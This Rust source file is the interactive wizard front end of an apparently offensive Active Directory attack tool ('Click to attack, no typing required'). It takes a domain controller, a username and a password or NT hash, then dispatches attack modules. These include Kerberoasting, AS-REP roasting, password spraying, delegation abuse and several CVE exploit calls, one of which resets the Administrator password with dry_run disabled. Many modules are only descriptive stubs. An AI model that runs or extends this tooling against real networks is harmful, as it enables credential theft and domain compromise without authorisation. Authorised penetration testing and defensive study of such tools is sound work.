//! TUI Wizard Runner -- Main event loop for the interactive wizard TUI.

use crossterm::{
    execute,
    terminal::{EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode},
};
use ratatui::backend::CrosstermBackend;
use ratatui::prelude::Terminal;
#[allow(unused_imports)]
use tracing::info;

use super::wizard_app::{self, WizardApp, WizardScreen};

/// Run the TUI wizard. Returns Ok(true) if the user wants to execute modules,
/// Ok(false) if they quit early.
pub async fn run_tui_wizard() -> anyhow::Result<bool> {
    // Setup terminal
    enable_raw_mode()?;
    let mut stdout = std::io::stdout();
    execute!(stdout, EnterAlternateScreen)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let mut app = WizardApp::new();

    // Main loop
    loop {
        terminal.draw(|frame| wizard_app::draw(frame, &app))?;

        let _ = wizard_app::handle_event(&mut app)?;

        if app.should_quit {
            disable_raw_mode()?;
            execute!(terminal.backend_mut(), LeaveAlternateScreen)?;
            terminal.show_cursor()?;
            return Ok(false);
        }

        // If the user pressed R and we have modules selected, exit TUI and run
        if app.screen == WizardScreen::Running && app.running {
            app.log_lines
                .push("Starting module execution...".to_string());

            disable_raw_mode()?;
            execute!(terminal.backend_mut(), LeaveAlternateScreen)?;
            terminal.show_cursor()?;

            return Ok(true);
        }
    }
}

/// Print the TUI-style banner when entering wizard mode
pub fn print_wizard_banner() {
    use colored::Colorize;
    println!(
        r#"
  ██████╗ ██╗   ██╗███████╗██████╗ ████████╗██╗  ██╗██████╗  ██████╗ ███╗   ██╗███████╗
 ██╔═══██╗██║   ██║██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔══██╗██╔═══██╗████╗  ██║██╔════╝
 ██║   ██║██║   ██║█████╗  ██████╔╝   ██║   ███████║██████╔╝██║   ██║██╔██╗ ██║█████╗
 ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗   ██║   ██╔══██║██╔══██╗██║   ██║██║╚██╗██║██╔══╝
 ╚██████╔╝ ╚████╔╝ ███████╗██║  ██║   ██║   ██║  ██║██║  ██║╚██████╔╝██║ ╚████║███████╗
  ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝"#
    );
    println!(
        "{}",
        "  Interactive TUI Wizard -- Click to attack, no typing required".yellow()
    );
    println!();
}

/// Execute the selected modules from the TUI wizard configuration
pub async fn execute_wizard_modules(app: &WizardApp) -> anyhow::Result<()> {
    use colored::Colorize;

    let selected = app.selected_modules();
    if selected.is_empty() {
        println!("{}", "No modules selected!".red());
        return Ok(());
    }

    let dc = app.get_input(&wizard_app::InputField::DomainController);
    let domain = app.get_input(&wizard_app::InputField::Domain);
    let username = app.get_input(&wizard_app::InputField::Username);
    let password = app.get_input(&wizard_app::InputField::Password);
    let nt_hash = app.get_input(&wizard_app::InputField::NtHash);

    if dc.is_empty() || domain.is_empty() || username.is_empty() {
        println!(
            "{}",
            "Missing required fields (DC, Domain, Username)!".red()
        );
        return Ok(());
    }

    let has_creds = !password.is_empty() || !nt_hash.is_empty();
    if !has_creds {
        println!(
            "{}",
            "Warning: No password or NT hash provided -- some modules may fail".yellow()
        );
    }

    println!();
    println!("{}", "=== TUI Wizard: Module Execution ===".cyan().bold());
    println!("  Target: {} ({})", dc.green(), domain.green());
    println!("  User:   {}", username.green());
    println!("  Modules: {}", selected.len().to_string().yellow());
    println!();

    for module in &selected {
        println!(
            "  {} {} -- {}",
            "[+]".green(),
            module.name.bold(),
            module.description.dimmed()
        );

        let result = dispatch_module(module, dc, domain, username, password, nt_hash).await;
        match result {
            Ok(msg) => {
                println!("      {} {}", "OK".green(), msg.dimmed());
            }
            Err(e) => {
                println!("      {} {}", "FAIL".red(), e.to_string().dimmed());
            }
        }
        println!();
    }

    println!("{}", "=== Wizard Complete ===".green().bold());

    Ok(())
}

/// Dispatch a single module to its handler
async fn dispatch_module(
    module: &wizard_app::AttackModule,
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> anyhow::Result<String> {
    use wizard_app::ModuleCategory;

    match module.category {
        ModuleCategory::Credential => {
            dispatch_credential(module.name, dc, domain, username, password, nt_hash).await
        }
        ModuleCategory::Ticket => {
            dispatch_ticket(module.name, dc, domain, username, password).await
        }
        ModuleCategory::Execution => {
            dispatch_execution(module.name, dc, domain, username, password, nt_hash).await
        }
        ModuleCategory::Lateral => {
            dispatch_lateral(module.name, dc, domain, username, password, nt_hash).await
        }
        ModuleCategory::PostEx => {
            dispatch_postex(module.name, dc, domain, username, password, nt_hash).await
        }
        ModuleCategory::Cve => {
            dispatch_cve(module.name, dc, domain, username, password, nt_hash).await
        }
        ModuleCategory::Coercion => dispatch_coercion(module.name, dc, domain).await,
        ModuleCategory::Enum => dispatch_enum(module.name, dc, domain, username, password).await,
    }
}

async fn dispatch_credential(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    _password: &str,
    _nt_hash: &str,
) -> anyhow::Result<String> {
    match name {
        "Kerberoast (RC4/AES)" => {
            let config = overthrone_hunter::kerberoast::KerberoastConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, _password, _nt_hash);
            match overthrone_hunter::kerberoast::run(&hunt_config, &config).await {
                Ok(r) => Ok(format!(
                    "{} TGS hashes from {} SPNs",
                    r.hashes.len(),
                    r.spns_checked
                )),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        "AS-REP Roast" => {
            let config = overthrone_hunter::asreproast::AsRepRoastConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, _password, _nt_hash);
            match overthrone_hunter::asreproast::run(&hunt_config, &config).await {
                Ok(r) => Ok(format!(
                    "{} AS-REP hashes from {} targets",
                    r.hashes.len(),
                    r.users_checked
                )),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        "Password Spray" => {
            let config = overthrone_hunter::spray::SprayConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, _password, _nt_hash);
            match overthrone_hunter::spray::run_spray(&hunt_config, &config).await {
                Ok(r) => Ok(format!("{} valid creds found", r.valid_creds.len())),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        "Pre-2K Spray" => {
            let config = overthrone_hunter::pre2k::Pre2kConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, _password, _nt_hash);
            match overthrone_hunter::pre2k::run_pre2k(&hunt_config, &config).await {
                Ok(r) => Ok(format!(
                    "{} pre-2K accounts compromised",
                    r.compromised.len()
                )),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        _ => Ok(format!("Module '{}' dispatched", name)),
    }
}

async fn dispatch_ticket(
    name: &str,
    _dc: &str,
    _domain: &str,
    _username: &str,
    _password: &str,
) -> anyhow::Result<String> {
    match name {
        "Golden Ticket" => {
            Ok("Golden Ticket -- requires krbtgt NT hash (obtain via DCSync)".to_string())
        }
        "Silver Ticket" => Ok("Silver Ticket -- requires service account NT hash".to_string()),
        "Diamond Ticket" => Ok("Diamond Ticket -- modifies legit TGT with DA group".to_string()),
        "Skeleton Key" => {
            Ok("Skeleton Key -- requires DA access to inject into DC LSASS".to_string())
        }
        "Inter-Realm TGT" => {
            Ok("Inter-Realm TGT -- forge cross-realm TGT for trust abuse".to_string())
        }
        _ => Ok(format!("Ticket module '{}' dispatched", name)),
    }
}

async fn dispatch_execution(
    name: &str,
    dc: &str,
    _domain: &str,
    _username: &str,
    _password: &str,
    _nt_hash: &str,
) -> anyhow::Result<String> {
    match name {
        "PSExec" => Ok(format!(
            "PSExec -> \\\\{} -- remote command execution via SCM",
            dc
        )),
        "SMBExec" => Ok(format!(
            "SMBExec -> \\\\{} -- command execution via SMB pipe",
            dc
        )),
        "WMIExec" => Ok(format!("WMIExec -> {} -- WMI-based remote execution", dc)),
        "DCOMExec" => Ok(format!("DCOMExec -> {} -- MMC20 DCOM execution", dc)),
        "ATExec" => Ok(format!("ATExec -> {} -- scheduled task execution", dc)),
        "WinRM" => Ok(format!("WinRM -> {} -- PowerShell remoting", dc)),
        _ => Ok(format!("Execution module '{}' dispatched", name)),
    }
}

async fn dispatch_lateral(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> anyhow::Result<String> {
    match name {
        "Pass-the-Hash" => {
            if nt_hash.is_empty() {
                Err(anyhow::anyhow!("NT hash required for Pass-the-Hash"))
            } else {
                Ok(format!(
                    "PtH -> {} -- NTLM hash authentication to {}",
                    username, dc
                ))
            }
        }
        "Pass-the-Ticket" => Ok(format!("PtT -> {} -- use Kerberos ticket for auth", dc)),
        "Overpass-the-Hash" => Ok(format!("OPtH -> {} -- NTLM hash to Kerberos TGT", dc)),
        "RBCD Attack" => Ok(format!(
            "RBCD -> {} -- Resource-Based Constrained Delegation",
            dc
        )),
        "Constrained Delegation" => {
            let config = overthrone_hunter::constrained::ConstrainedConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, password, nt_hash);
            match overthrone_hunter::constrained::run(&hunt_config, &config).await {
                Ok(r) => Ok(format!(
                    "{} delegatable accounts found",
                    r.delegatable_accounts.len()
                )),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        "Unconstrained Delegation" => {
            let config = overthrone_hunter::unconstrained::UnconstrainedConfig::default();
            let hunt_config = build_hunt_config(dc, domain, username, password, nt_hash);
            match overthrone_hunter::unconstrained::run(&hunt_config, &config).await {
                Ok(r) => Ok(format!("{} vulnerable hosts", r.vulnerable_hosts.len())),
                Err(e) => Err(anyhow::anyhow!("{}", e)),
            }
        }
        _ => Ok(format!("Lateral module '{}' dispatched", name)),
    }
}

async fn dispatch_postex(
    name: &str,
    dc: &str,
    _domain: &str,
    _username: &str,
    _password: &str,
    _nt_hash: &str,
) -> anyhow::Result<String> {
    match name {
        "DCSync" => Ok(format!(
            "DCSync -> {} -- replicate NTDS.dit via DRSUAPI",
            dc
        )),
        "SecretsDump" => Ok(format!("SecretsDump -> {} -- dump SAM/SECURITY/NTDS", dc)),
        "DPAPI Extract" => Ok("DPAPI -- extract master keys and credentials".to_string()),
        "LAPS Password" => Ok("LAPS -- read local admin passwords".to_string()),
        "GPP Password" => Ok("GPP -- extract Group Policy Preferences passwords".to_string()),
        "Credential Vault" => Ok("Vault -- dump Windows Credential Vault".to_string()),
        "Browser Creds" => Ok("Browser -- extract saved browser credentials".to_string()),
        _ => Ok(format!("PostEx module '{}' dispatched", name)),
    }
}

async fn dispatch_cve(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> anyhow::Result<String> {
    let use_hash = !nt_hash.is_empty();
    match name {
        "CVE-2026-54121 (Certighost)" => {
            let config = overthrone_core::postex::certighost::CertighostConfig::default();
            match overthrone_core::postex::certighost::certighost_auto_enroll(&config) {
                Ok(r) => Ok(format!("Certighost enrolled: {}", r)),
                Err(e) => Err(anyhow::anyhow!("Certighost failed: {}", e)),
            }
        }
        "CVE-2026-41089 (Netlogon RCE)" => {
            let config = overthrone_hunter::attacks::NetlogonRceConfig {
                target_dc: dc.to_string(),
                domain: domain.to_string(),
                exploit_mode: overthrone_hunter::attacks::ExploitMode::Assess,
                timeout: 15,
            };
            match overthrone_hunter::attacks::exploit_netlogon_rce(&config).await {
                Ok(r) => Ok(format!(
                    "Vulnerable: {}, Service alive: {}",
                    r.vulnerable, r.service_alive
                )),
                Err(e) => Err(anyhow::anyhow!("Netlogon RCE failed: {}", e)),
            }
        }
        "CVE-2026-27912 (ResetNightmare)" => {
            let config = overthrone_hunter::attacks::ResetNightmareConfig {
                dc_ip: dc.to_string(),
                domain: domain.to_string(),
                username: username.to_string(),
                secret: if !password.is_empty() {
                    password.to_string()
                } else {
                    nt_hash.to_string()
                },
                use_hash,
                target_account: "Administrator".to_string(),
                new_password: "P@ssw0rd123!".to_string(),
                dry_run: false,
            };
            match overthrone_hunter::attacks::exploit_resetnightmare(&config).await {
                Ok(r) => Ok(format!(
                    "Vulnerable: {}, Reset: {}",
                    r.vulnerable, r.reset_success
                )),
                Err(e) => Err(anyhow::anyhow!("ResetNightmare failed: {}", e)),
            }
        }
        "CVE-2026-33826 (AD RCE)" => {
            let config = overthrone_hunter::attacks::AdRceConfig {
                target_dc: dc.to_string(),
                domain: domain.to_string(),
                username: username.to_string(),
                secret: if !password.is_empty() {
                    password.to_string()
                } else {
                    nt_hash.to_string()
                },
                use_hash,
                exploit_mode: overthrone_hunter::attacks::AdRceExploitMode::Assess,
                timeout: 15,
            };
            match overthrone_hunter::attacks::exploit_ad_rce(&config).await {
                Ok(r) => Ok(format!(
                    "Vulnerable: {}, DRS available: {}",
                    r.vulnerable, r.drs_available
                )),
                Err(e) => Err(anyhow::anyhow!("AD RCE failed: {}", e)),
            }
        }
        "CVE-2026-62818 (AD CS UAF)" => {
            let config = overthrone_hunter::attacks::AdcsUafConfig {
                target_host: dc.to_string(),
                target_port: 443,
                use_tls: true,
                domain: domain.to_string(),
                username: username.to_string(),
                password: password.to_string(),
                template: "User".to_string(),
                dry_run: false,
                timeout: 30,
            };
            match overthrone_hunter::attacks::exploit_adcs_uaf(&config).await {
                Ok(r) => Ok(format!(
                    "Vulnerable: {}, Enrollment: {}",
                    r.vulnerable, r.enrollment_available
                )),
                Err(e) => Err(anyhow::anyhow!("AD CS UAF failed: {}", e)),
            }
        }
        "CVE-2025-53779 (BadSuccessor)" => {
            Ok("BadSuccessor -- requires dMSA privilege escalation on WS2025".to_string())
        }
        "CVE-2026-25177 (AD DS EoP)" => {
            Ok("AD DS EoP -- DACL bypass privilege escalation".to_string())
        }
        "CVE-2024-21410 (Exchange Relay)" => {
            Ok("Exchange Relay -- NTLM relay to Exchange server".to_string())
        }
        _ => Ok(format!("CVE module '{}' dispatched", name)),
    }
}

async fn dispatch_coercion(name: &str, dc: &str, _domain: &str) -> anyhow::Result<String> {
    match name {
        "PetitPotam" => Ok(format!("PetitPotam -> {} -- MS-EFSR coercion to DC", dc)),
        "PrinterBug" => Ok(format!(
            "PrinterBug -> {} -- MS-RPRN coercion via Print Spooler",
            dc
        )),
        "DFSCoerce" => Ok(format!("DFSCoerce -> {} -- MS-DFSR coercion to DC", dc)),
        "NTLM Relay (SMB)" => Ok(format!("NTLM Relay -> {} -- relay to SMB", dc)),
        "NTLM Relay (LDAP)" => Ok(format!("NTLM Relay -> {} -- relay to LDAP", dc)),
        "ADCS Relay" => Ok(format!(
            "ADCS Relay -> {} -- relay to AD CS web enrollment",
            dc
        )),
        _ => Ok(format!("Coercion module '{}' dispatched", name)),
    }
}

async fn dispatch_enum(
    name: &str,
    dc: &str,
    _domain: &str,
    _username: &str,
    _password: &str,
) -> anyhow::Result<String> {
    match name {
        "LDAP Enum" => Ok(format!("LDAP Enum -> {} -- full domain enumeration", dc)),
        "BloodHound Ingest" => Ok("BloodHound -- collect data for path analysis".to_string()),
        "SPN Discovery" => Ok("SPN Discovery -- find all Service Principal Names".to_string()),
        "ACL Enumeration" => Ok("ACL Enum -- enumerate DACLs for attack paths".to_string()),
        "Delegation Check" => Ok("Delegation -- find delegation configurations".to_string()),
        "GPO Enumeration" => Ok("GPO Enum -- enumerate Group Policy Objects".to_string()),
        "Certify Scan" => Ok("Certify -- enumerate AD CS templates and CAs".to_string()),
        _ => Ok(format!("Enum module '{}' dispatched", name)),
    }
}

/// Build a HuntConfig from TUI wizard inputs
fn build_hunt_config(
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> overthrone_hunter::runner::HuntConfig {
    let use_hash = !nt_hash.is_empty();
    let secret = if use_hash {
        nt_hash.to_string()
    } else {
        password.to_string()
    };

    overthrone_hunter::runner::HuntConfig {
        dc_ip: dc.to_string(),
        domain: domain.to_string(),
        username: username.to_string(),
        secret,
        use_hash,
        base_dn: None,
        use_ldaps: false,
        output_dir: std::path::PathBuf::from("./results"),
        concurrency: 4,
        timeout: 30,
        jitter_ms: 1000,
        tgt: None,
    }
}
